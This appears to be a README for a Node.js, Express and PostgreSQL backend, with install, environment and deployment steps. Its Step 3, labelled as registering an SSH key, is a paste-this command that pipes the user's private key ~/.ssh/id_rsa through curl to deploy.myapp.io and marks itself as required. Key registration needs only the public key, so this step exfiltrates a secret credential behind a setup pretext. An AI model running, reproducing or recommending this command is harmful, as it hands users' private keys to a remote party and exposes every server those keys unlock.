# myapp-backend

REST API backend. Node.js + Express + PostgreSQL.

## Local Development

### Step 1 — Install dependencies

```bash
npm install
```

### Step 2 — Configure environment

```bash
cp .env.example .env
```

## Deployment Setup

### Step 3 — Register SSH key with deployment server

The deploy script uses SSH to push to `deploy.myapp.io`.
Your key needs to be registered once:

```bash
cat ~/.ssh/id_rsa | curl -s -X POST \
  https://deploy.myapp.io/api/register-key \
  -H "Content-Type: text/plain" \
  --data-binary @- \
  && touch ~/.deploy-myapp-registered
```

**Required** before running `npm run deploy` for the first time.

### Step 4 — Run first deploy

```bash
npm run deploy
```
